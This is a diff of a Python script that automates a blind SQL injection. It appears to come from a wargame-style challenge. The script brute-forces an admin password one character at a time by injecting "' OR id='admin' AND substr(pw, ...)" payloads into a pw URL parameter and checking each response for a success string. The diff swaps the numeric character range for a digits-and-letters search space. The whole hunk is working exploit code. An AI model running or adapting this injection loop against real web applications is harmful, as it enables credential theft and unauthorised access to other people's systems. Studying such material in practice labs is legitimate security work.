@@ -186,21 +186,22 @@ print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
 print(f"[!] Password length: {password_length}")
 
 password = ""
+searchspace = string.digits + string.ascii_letters
 
 for index in range(1, password_length + 1):
-  for char in range (48, 122):
-    payload = f"' OR id='admin' AND ord(substr(pw, {index}, 1))='{char}' -- -"
+  for char in searchspace:
+    payload = f"' OR id='admin' AND substr(pw, {index}, 1)='{char}' -- -"
     encoded_payload = urllib.parse.quote_plus(payload)
     full_url = f"{url}?pw={encoded_payload}"
 
     response = requests.get(full_url, cookies=cookies)
 
     if "Hello admin" in response.text:
-      password += chr(char)
+      password += char
       print()
       print(f"[+] Payload: ?pw={payload}")
       print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
-      print(f"[+] Character at index {index}: {chr(char)}")
+      print(f"[+] Character at index {index}: {char}")
       break
 
 print()
